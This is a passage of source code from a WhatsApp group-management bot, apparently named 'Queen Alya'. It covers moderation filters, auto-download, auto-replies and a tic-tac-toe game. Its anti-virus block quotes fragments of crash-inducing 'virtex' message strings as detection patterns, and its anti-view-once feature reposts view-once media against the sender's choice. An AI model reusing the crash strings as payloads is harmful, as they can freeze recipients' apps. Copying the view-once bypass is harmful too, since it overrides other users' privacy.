    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

//trace anime
function formatDuration(ms) {
  let seconds = Math.floor((ms / 1000) % 60);
  let minutes = Math.floor((ms / (1000 * 60)) % 60);
  let hours = Math.floor((ms / (1000 * 60 * 60)) % 24);
  return `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}:${seconds.toString().padStart(2, "0")}`;
}
        
        //limit func
        async function useLimit(senuseLimitder, amount) {
            db.data.users[sender].limit -= amount
            db.data.users[sender].totalLimit += amount
            replygcalya(`You have used up: ${amount} limit\nRemaining: ${db.data.users[sender].limit} limit`)
        }
        async function resetLimit() {
            let users = Object.keys(global.db.data.users)
            let LimitAlya = isPremium ? limit.prem : limit.free
            for (let i of users) {
               db.data.users[i].limit = LimitAlya
            }
            AlyaBotInc.sendText('120363167338947238@g.us', { text: `Reset Limit`})
        }
        // Grup Only
        if (!m.isGroup && !AlyaTheQueen && db.data.settings[botNumber].onlygrub ) {
        	if (isCommand){
            return replygcalya(`Hello buddy! Because We Want to Reduce Spam, Please Use Bot in the Group Chat !\n\nIf you have issue please chat owner wa.me/${ownernumber}`)
            }
        }
        // Private Only
        if (!AlyaTheQueen && db.data.settings[botNumber].onlypc && m.isGroup) {
        	if (isCommand){
	         return replygcalya("Hello buddy! if you want to use this bot, please chat the bot in private chat")
	     }
	}
	     
        if (!AlyaBotInc.public) {
            if (AlyaTheQueen && !m.key.fromMe) return
        }
        if (db.data.settings[botNumber].online) {
        	if (isCommand) {
        	AlyaBotInc.sendPresenceUpdate('unavailable', from)
        }
        }
        if (db.data.settings[botNumber].autoread) {
            AlyaBotInc.readMessages([m.key])
        }
        //auto set bio\\
	if (db.data.settings[botNumber].autobio) {
            AlyaBotInc.updateProfileStatus(`${botname} Have Been Running For ${runtime(process.uptime())}`).catch(_ => _)
        }
     //auto type record
        if (db.data.settings[botNumber].autorecordtype){
        if (isCommand) {
            let alyamix = ['composing', 'recording']
            alyamix2 = alyamix[Math.floor(alyamix.length * Math.random())]
            AlyaBotInc.sendPresenceUpdate(alyamix2, from)
        }
        }
        if (db.data.settings[botNumber].autorecord){
        if (isCommand) {
        	let alyamix = ['recording']
            alyamix2 = alyamix[Math.floor(alyamix.length * Math.random())]
            AlyaBotInc.sendPresenceUpdate(alyamix2, from)
        }
        }
        if (db.data.settings[botNumber].autotype){
        if (isCommand) {
        	let alyapos = ['composing']
            AlyaBotInc.sendPresenceUpdate(alyapos, from)
        }
        }
        
        //auto block number
        if (m.sender.startsWith(`${autoblocknumber}`) && db.data.settings[botNumber].autoblocknum === true) {
            return AlyaBotInc.updateBlockStatus(m.sender, 'block')
        }
        if (!m.sender.startsWith('91') && db.data.settings[botNumber].onlyindia === true) {
            return AlyaBotInc.updateBlockStatus(m.sender, 'block')
        }
        if (!m.sender.startsWith('62') && db.data.settings[botNumber].onlyindo === true) {
            return AlyaBotInc.updateBlockStatus(m.sender, 'block')
        } 
        if (!m.sender.startsWith(`${antiforeignnumber}`) && db.data.chats[m.chat].antiforeignnum === true){ 
        	if (AlyaTheQueen || isAdmins || !isBotAdmins) return
            AlyaBotInc.sendMessage(m.chat, { text: `Sorry buddy! you will be removed because the group admin/owner has enabled anti foreign number, only +${antiforeignnumber} country code is allowed to join the group` }, {quoted: m})
            await sleep(2000)
            await AlyaBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        }
        let list = []
for (let i of owner) {
list.push({
	    	displayName: await AlyaBotInc.getName(i),
	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await AlyaBotInc.getName(i)}\nFN:${await AlyaBotInc.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
	    })
	}
        //console log
        if (isCommand) {
            console.log(color(`\n< ================================================== >\n`, 'cyan'))
            console.log(chalk.black(chalk.bgWhite(!isCommand ? '[ MESSAGE ]' : '[ COMMAND ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> In'), chalk.green(m.isGroup ? pushname : 'Private Chat', m.chat))
            global.db.data.settings[botNumber].totalhit += 1
        }

        //antiviewonce
    if ( db.data.chats[m.chat].antiviewonce && m.isGroup && m.mtype == 'viewOnceMessageV2') {
        let val = { ...m }
        let msg = val.message?.viewOnceMessage?.message || val.message?.viewOnceMessageV2?.message
        delete msg[Object.keys(msg)[0]].viewOnce
        val.message = msg
        await AlyaBotInc.sendMessage(m.chat, { forward: val }, { quoted: m })
    }
    
    //antispam kick
if (db.data.chats[m.chat].antispam) {
if (m.isGroup && m.message && alya_antispam.isFiltered(from)) {
console.log(`[SPAM]`, color(moment(m.messageTimestamp * 100).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`), 'from', color(m.pushName))
return await AlyaBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}
}
    
    // Anti promotion
if (db.data.chats[m.chat].antipromotion) {
if (budy.match(`instagram booster|tiktok booster|ml booster|bgmi selling|selling uc|selling diamonds|selling coin|selling id|selling account|selling ids|buy account|sell account|buy id|sell id|instagram followers|tiktok followers|buy panel|sell panel|sell bug bot|buy bug bot|buy bot bug|sell bot bug|adminpanel5kpm|open jasa push member grup|yangmaubuypanelpm|admin panel 10k pm|Hanya menyediakan Jasa Push Member Grup|admin panel 5k pm|yang mau beli panel murah pm|list harga panel by|list harga vps|LIST HARGA VPS|OPEN JASA PUSH MEMBER GRUP|READY|Redy|LIST HARGA PANEL BY|list harga panel|menyediakan|MENYEDIAKAN|OPEN MURBUG|open|OPEN|PANEL READY|PANEL|PANNEL READY|panel|panel ready|pannel ready minat pm|mau panel pm|MAU PANNEL PM|Admin panel ready|ADMIN PANEL READY|Chat aja om ready selalu|OPEN JASA INSTALL|open jasa installMENYEDIAKAN JASA INSTALL|menyediakan jasa install`)) {
if (!isBotAdmins) return
if(AlyaTheQueen) return
if (isAdmins) return
AlyaBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: true,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
AlyaBotInc.sendMessage(from, {text:`\`\`\`「 Promotion Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} has sent a promotion message and successfully deleted`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
}
}

        //ANTI VIRUS
if (isGroup && db.data.chats[m.chat].antivirtex) {
if (budy.includes('๒๒๒๒') || budy.includes('ดุ') || budy.includes('ผิดุท้เึางืผิดุท้เึางื') || budy.includes('๑๑๑๑๑๑๑๑') || budy.includes('৭৭৭৭৭৭৭৭') || budy.includes('   ⃢   ⃢   ⃢  ') || budy.includes('*⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟') || budy.includes('ผดิทุเ้ึางผืดิทุเ้') || budy.includes('.*࡞ࣰࣰࣰࣲࣲࣲࣲࣩࣩࣩࣩࣶࣶ࣯࣯࣮࣮ࣦ࣯ࣨࣨࣨࣻࣻࣻࣼࣼࣼࣽࣽࣾࣷࣵࣴ࣬࣬࣬ࣤࣤࣧࣧ*') || budy.includes('᥋') || budy.includes('؁') || budy.includes('ٯٯٯٯٯ') ) {
if (isGroupAdmins) return replygcalya('*VIRTEX DETECTED*')
console.log(color('[KICK]', 'red'), color('Received a virus text!', 'yellow'))
AlyaBotInc.sendText(m.chat, `*MARK AS READ*\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n *Virus sender here👇:* \nwa.me/${sender.split("@")[0]}`)   
if (!isBotAdmins) return
if(AlyaTheQueen) return
AlyaBotInc.groupParticipantsUpdate(from, [sender], 'remove')
await AlyaBotInc.sendMessage(from, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
AlyaBotInc.sendMessage(`${ownernumber}@s.whatsapp.net`,{text: `Hi Owner! wa.me/${sender.split("@")[0]} Detected Having Sent Virtex ${isGroup?`in ${groupName}`:''}`})
 }
 }
 
 if (db.data.chats[m.chat].antibot) {
    if (m.isBaileys && m.fromMe == true){
        if (isAdmins || !isBotAdmins){		  
        } else {
          replygcalya(`*Another Bot Detected*\n\nHusshhh Get away from this group!!!`)
    return await AlyaBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        }
    }
   }
 
        //anti media
        if (db.data.chats[m.chat].antimedia && isMedia) {
        if (AlyaTheQueen || isAdmins || !isBotAdmins){		  
        } else {
          replygcalya(`\`\`\`「 Media Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-media for this group`)
    return AlyaBotInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
  }
        if (db.data.chats[m.chat].image && isAlyaMedia) {
    if(isAlyaMedia === "imageMessage"){
        if (AlyaTheQueen || isAdmins || !isBotAdmins){		  
        } else {
          replygcalya(`\`\`\`「 Image Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-image for this group`)
    return AlyaBotInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
        if (db.data.chats[m.chat].antivideo && isAlyaMedia) {
    if(isAlyaMedia === "videoMessage"){
        if (AlyaTheQueen || isAdmins || !isBotAdmins){		  
        } else {
          replygcalya(`\`\`\`「 Video Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-video for this group`)
    return AlyaBotInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
        if (db.data.chats[m.chat].antisticker && isAlyaMedia) {
    if(isAlyaMedia === "stickerMessage"){
        if (AlyaTheQueen || isAdmins || !isBotAdmins){		  
        } else {
          replygcalya(`\`\`\`「 Sticker Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-sticker for this group`)
    return AlyaBotInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
        if (db.data.chats[m.chat].antiaudio && isAlyaMedia) {
    if(isAlyaMedia === "audioMessage"){
        if (AlyaTheQueen || isAdmins || !isBotAdmins){		  
        } else {
          replygcalya(`\`\`\`「 Audio Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-audio for this group`)
    return AlyaBotInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
       if (db.data.chats[m.chat].antipoll && isAlyaMedia) {
    if(isAlyaMedia === "pollCreationMessage"){
        if (AlyaTheQueen || isAdmins || !isBotAdmins){		  
        } else {
          replygcalya(`\`\`\`「 Poll Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-poll for this group`)
    return AlyaBotInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
       if (db.data.chats[m.chat].antilocation && isAlyaMedia) {
    if(isAlyaMedia === "locationMessage"){
        if (AlyaTheQueen || isAdmins || !isBotAdmins){		  
        } else {
          replygcalya(`\`\`\`「 Location Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-location for this group`)
    return AlyaBotInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
       if (db.data.chats[m.chat].antidocument && isAlyaMedia) {
    if(isAlyaMedia === "documentMessage"){
        if (AlyaTheQueen || isAdmins || !isBotAdmins){		  
        } else {
          replygcalya(`\`\`\`「 Document Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-document for this group`)
    return AlyaBotInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
      if (db.data.chats[m.chat].anticontact && isAlyaMedia) {
    if(isAlyaMedia === "contactMessage"){
        if (AlyaTheQueen || isAdmins || !isBotAdmins){		  
        } else {
          replygcalya(`\`\`\`「 Contact Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-contact for this group`)
    return AlyaBotInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
        //respond
        if (db.data.chats[m.chat].badword) {
            for (let bak of bad) {
               if (budy === bak) {
                  let baduser = await db.data.users[sender].badword
                  AlyaBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			AlyaBotInc.sendMessage(from, {text:`\`\`\`「 Bad Word Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} was using harsh words and his chat has been deleted`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
               }
            }
        }
        //auto download #ctto
        if (db.data.settings[botNumber].autodownload && !m.key.fromMe && !isCmd2) {
    try {
        if (budy.match(`instagram.com`)) {
            await AlyaBotInc.sendMessage(m.chat, { react: { text: "⏱️", key: m.key } });
            let anu = await fetchJson(`https://widipe.com/download/igdl?url=${budy}`);
            AlyaBotInc.sendMessage(m.chat, { video: { url: anu.result[0].url }, caption: `Auto Download ✅` }, { quoted: m });
            await AlyaBotInc.sendMessage(m.chat, { react: { text: "✅", key: m.key } }); // Success message
        } else if (budy.match(`tiktok.com`)) {
            await AlyaBotInc.sendMessage(m.chat, { react: { text: "⏱️", key: m.key } });
            let anu = await fetchJson(`https://widipe.com/download/tiktokdl?url=${budy}`);
            AlyaBotInc.sendMessage(m.chat, { video: { url: anu.result.video }, caption: `Auto Download ✅` }, { quoted: m });
            await AlyaBotInc.sendMessage(m.chat, { react: { text: "✅", key: m.key } }); // Success message
        } else if (budy.match(`facebook.com`)) {
            await AlyaBotInc.sendMessage(m.chat, { react: { text: "⏱️", key: m.key } });
            let anu = await fetchJson(`https://itzpire.com/download/facebook?url=${budy}`);
            AlyaBotInc.sendMessage(m.chat, { video: { url: anu.data.video_sd }, caption: `Auto Download ✅` }, { quoted: m });
            await AlyaBotInc.sendMessage(m.chat, { react: { text: "✅", key: m.key } }); // Success message
        } else if (budy.match(`mediafire.com`)) {
            await AlyaBotInc.sendMessage(m.chat, { react: { text: "⏱️", key: m.key } });
            let anu = await fetchJson(`https://widipe.com/mediafire?link=${budy}`);
            await AlyaBotInc.sendMessage(m.chat, {
                document: { url: anu.result.url },
                mimetype: 'application/zip',
                fileName: anu.result.filename
            }, { quoted: m });
            await AlyaBotInc.sendMessage(m.chat, { react: { text: "✅", key: m.key } }); // Success message
        } else if (budy.match(`pin.it`)) {
            await AlyaBotInc.sendMessage(m.chat, { react: { text: "⏱️", key: m.key } });
            let anu = await fetchJson(`https://widipe.com/download/pindl?url=${budy}`);

            // Check if the response contains the expected data
            if (anu.result && anu.result.data && anu.result.data.media_type) {
                // Handle video download specifically
                if (anu.result.data.media_type === "video/mp4") {
                    // Check if the image URL ends with .mp4
                    const videoUrl = anu.result.data.image; // 'image' is the video URL
                    if (videoUrl.endsWith('.mp4')) {
                        AlyaBotInc.sendMessage(m.chat, { video: { url: videoUrl }, caption: `Auto Download ✅\nTitle: ${anu.result.data.title}` }, { quoted: m });
                        await AlyaBotInc.sendMessage(m.chat, { react: { text: "✅", key: m.key } }); // Success message
                    } else {
                        AlyaBotInc.sendMessage(m.chat, { text: `Error: Video URL is not valid!` }, { quoted: m });
                    }
                } else if (anu.result.data.media_type === "image/jpeg") {
                    if (anu.result.data.image) {
                        AlyaBotInc.sendMessage(m.chat, { image: { url: anu.result.data.image }, caption: `Auto Download ✅` }, { quoted: m });
                        await AlyaBotInc.sendMessage(m.chat, { react: { text: "✅", key: m.key } }); // Success message
                    } else {
                        AlyaBotInc.sendMessage(m.chat, { text: `Error: Image URL not found!` }, { quoted: m });
                    }
                } else {
                    AlyaBotInc.sendMessage(m.chat, { text: `Error: Unsupported media type!` }, { quoted: m });
                }
            } else {
                AlyaBotInc.sendMessage(m.chat, { text: `Error: Invalid response from Pinterest API!` }, { quoted: m });
            }
        } else if (budy.match(`youtube.com|youtu.be`)) {
            await AlyaBotInc.sendMessage(m.chat, { react: { text: "⏱️", key: m.key } });
            let anu = await fetchJson(`https://widipe.com/download/ytdl?url=${budy}`);
            AlyaBotInc.sendMessage(m.chat, { video: { url: anu.result.mp4 }, caption: `` }, { quoted: m });
            await AlyaBotInc.sendMessage(m.chat, { react: { text: "✅", key: m.key } }); // Success message
        }
    } catch (err) {
        await AlyaBotInc.sendMessage(m.chat, { react: { text: "✖️", key: m.key } });
    }
}
        
        //autosticker
        if (db.data.settings[botNumber].autosticker) {
        	if (m.key.fromMe) return
            if (/image/.test(mime) && !/webp/.test(mime)) {
                let mediac = await quoted.download()
                AlyaBotInc.sendImageAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
                console.log(`Auto sticker detected`)
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return
                let mediac = await quoted.download()
                AlyaBotInc.sendVideoAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
            }
        }
        
        if (db.data.chats[m.chat].antilinkgc) {
            if (budy.match(`chat.whatsapp.com`)) {
               bvl = `\`\`\`「 GC Link Detected 」\`\`\`\n\nAdmin has sent a gc link, admin is free to send any link😇`
if (isAdmins) return replygcalya(bvl)
if (m.key.fromMe) return replygcalya(bvl)
if (AlyaTheQueen) return replygcalya(bvl)
               await AlyaBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			AlyaBotInc.sendMessage(from, {text:`\`\`\`「 GC Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} has sent a link and successfully deleted`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
            }
        }
        if (db.data.chats[m.chat].antilink) {
            if (budy.match('http') && budy.match('https')) {
               bvl = `\`\`\`「 Link Detected 」\`\`\`\n\nAdmin has sent a link, admin is free to send any link😇`
if (isAdmins) return replygcalya(bvl)
if (m.key.fromMe) return replygcalya(bvl)
if (AlyaTheQueen) return replygcalya(bvl)
               await AlyaBotInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			AlyaBotInc.sendMessage(from, {text:`\`\`\`「 Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} has sent a link and successfully deleted`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
            }
        }
        //afk
        let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
	     for (let jid of mentionUser) {
            let user = db.data.users[jid]
            if (!user) continue
            let afkTime = user.afkTime
            if (!afkTime || afkTime < 0) continue
            let reason = user.afkReason || ''
            replygcalya(`Please Don't Tag Him\nHe's AFK ${reason ? 'With reason ' + reason : 'no reason'}\nAfk Since ${clockString(new Date - afkTime)}`.trim())
        }
        if (db.data.users[m.sender].afkTime > -1) {
            let user = global.db.data.users[m.sender]
            replygcalya(`You Have Returned From AFK\nAFK Reason: ${user.afkReason ? user.afkReason : ''}\nAFK Duration: ${clockString(new Date - user.afkTime)}`.trim())
            user.afkTime = -1
            user.afkReason = ''
        }
        
//total features
const alyafeature = () =>{
            var mytext = fs.readFileSync("./Queenalya.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length
            return numUpper
        }
        
        //download status #ctto
        try {
  const textLower = m.text.toLowerCase();
  if (textLower === 'download' || textLower === 'statusdown' || textLower === 'take' || textLower === 'send') {
    const quotedMessage = m.msg.contextInfo.quotedMessage;
    if (quotedMessage) {
      if (quotedMessage.imageMessage) {
        let imageCaption = quotedMessage.imageMessage.caption;
        let imageUrl = await AlyaBotInc.downloadAndSaveMediaMessage(quotedMessage.imageMessage);
        AlyaBotInc.sendMessage(m.chat, { image: { url: imageUrl }, caption: imageCaption });
        replygcalya('*Downloading status...*');
      }
      if (quotedMessage.videoMessage) {
        let videoCaption = quotedMessage.videoMessage.caption;
        let videoUrl = await AlyaBotInc.downloadAndSaveMediaMessage(quotedMessage.videoMessage);
        AlyaBotInc.sendMessage(m.chat, { video: { url: videoUrl }, caption: videoCaption });
        replygcalya('*Downloading status...*');
      }
    }
  }
} catch (error) {
  console.error("Error in 'send message' handling:", error);
}
        //autoreply
for (let ReplyAlya of VoiceNoteAlya) {
if (budy === ReplyAlya) {
let audiobuffy = fs.readFileSync(`./AlyaMedia/audio/${ReplyAlya}.mp3`)
AlyaBotInc.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
}
}
for (let ReplyAlya of StickerAlya){
if (budy === ReplyAlya){
let stickerbuffy = fs.readFileSync(`./AlyaMedia/sticker/${ReplyAlya}.webp`)
AlyaBotInc.sendMessage(m.chat, { sticker: stickerbuffy }, { quoted: m })
}
}
for (let ReplyAlya of ImageAlya){
if (budy === ReplyAlya){
let imagebuffy = fs.readFileSync(`./AlyaMedia/image/${ReplyAlya}.jpg`)
AlyaBotInc.sendMessage(m.chat, { image: imagebuffy }, { quoted: m })
}
}
for (let ReplyAlya of VideoAlya){
if (budy === ReplyAlya){
let videobuffy = fs.readFileSync(`./AlyaMedia/video/${ReplyAlya}.mp4`)
AlyaBotInc.sendMessage(m.chat, { video: videobuffy }, { quoted: m })
}
}

const sendapk = (teks) => {
AlyaBotInc.sendMessage(from, { document: teks, mimetype: 'application/vnd.android.package-archive'}, {quoted:m})
}
for (let ReplyAlya of ApkAlya) {
if (budy === ReplyAlya) {
let buffer = fs.readFileSync(`./AlyaMedia/apk/${ReplyAlya}.apk`)
sendapk(buffer)
}
}

const sendzip = (teks) => {
AlyaBotInc.sendMessage(from, { document: teks, mimetype: 'application/zip'}, {quoted:m})
}
for (let ReplyAlya of ZipAlya) {
if (budy === ReplyAlya) {
let buffer = fs.readFileSync(`./AlyaMedia/zip/${ReplyAlya}.zip`)
sendzip(buffer)
}
}

const senddocu = (teks) => {
AlyaBotInc.sendMessage(from, { document: teks, mimetype: 'application/pdf'}, {quoted:m})
}
for (let ReplyAlya of DocAlya) {
if (budy === ReplyAlya) {
let buffer = fs.readFileSync(`./AlyaMedia/doc/${ReplyAlya}.pdf`)
senddocu(buffer)
}
}

// Response Addlist
if (m.isGroup && isAlreadyResponList(from, body.toLowerCase(), db_respon_list)) {
var get_data_respon = getDataResponList(from, body.toLowerCase(), db_respon_list)
if (get_data_respon.isImage === false) {
AlyaBotInc.sendMessage(from, { text: sendResponList(from, body.toLowerCase(), db_respon_list) }, {
quoted: m
})
} else {
AlyaBotInc.sendMessage(from, { image: await getBuffer(get_data_respon.image_url), caption: get_data_respon.response }, {
quoted: m
})
} 
}

// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(m.chat, { text: text, mentions: m.mentionedJid }, {
    userJid: AlyaBotInc.user.id,
    quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, AlyaBotInc.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
    ...chatUpdate,
    messages: [proto.WebMessageInfo.fromObject(messages)],
    type: 'append'
}
AlyaBotInc.ev.emit('messages.upsert', msg)
} 

//============= [LIST RESPONCE CHECKING START ]================
        if(m.mtype === "interactiveResponseMessage"){
            console.log("interactiveResponseMessage Detected!")   
            let msg = m.message[m.mtype]  || m.msg
            if(msg.nativeFlowResponseMessage  && !m.isBot  ){ 
                let { id } = JSON.parse(msg.nativeFlowResponseMessage.paramsJson) || {}  
                if(id){
                    let emit_msg = { 
                        key : { ...m.key } , // SET RANDOME MESSAGE ID  
                        message:{ extendedTextMessage : { text : id } } ,
                        pushName : m.pushName,
                        messageTimestamp  : m.messageTimestamp || 754785898978
                    }
                    return AlyaBotInc.ev.emit("messages.upsert" , { messages : [ emit_msg ] ,  type : "notify"})
                }
            }
        }
//============= [LIST RESPONCE CHECKING END ]================


//math
if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
	if (m.key.fromMe) return
            kuis = true
            jawaban = kuismath[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await replygcalya(`🎮 Math Quiz 🎮\n\nCorrect Answer 🎉\n\nWant To Play Again? Send ${prefix}math mode`)
                delete kuismath[m.sender.split('@')[0]]
            } else replygcalya('*Wrong Answer!*')
        }
        
        //game
        this.game = this.game ? this.game : {}
        let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
        if (room) {
            let ok
            let isWin = !1
            let isTie = !1
            let isSurrender = !1
            // replygcalya(`[DEBUG]\n${parseInt(m.text)}`)
            if (!/^([1-9]|(me)?giveup|surr?ender|off|skip)$/i.test(m.text)) return
            isSurrender = !/^[1-9]$/.test(m.text)
            if (m.sender !== room.game.currentTurn) {
                if (!isSurrender) return !0
            }
            if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
                replygcalya({
                    '-3': 'The game is over',
                    '-2': 'Invalid',
                    '-1': 'Invalid Position',
                    0: 'Invalid Position',
                } [ok])
                return !0
            }
            if (m.sender === room.game.winner) isWin = true
            else if (room.game.board === 511) isTie = true
            let arr = room.game.render().map(v => {
                return {
                    X: '❌',
                    O: '⭕',
                    1: '1️⃣',
                    2: '2️⃣',
                    3: '3️⃣',
                    4: '4️⃣',
                    5: '5️⃣',
                    6: '6️⃣',
                    7: '7️⃣',
                    8: '8️⃣',
                    9: '9️⃣',
                } [v]
            })
            if (isSurrender) {
                room.game._currentTurn = m.sender === room.game.playerX
                isWin = true
            }
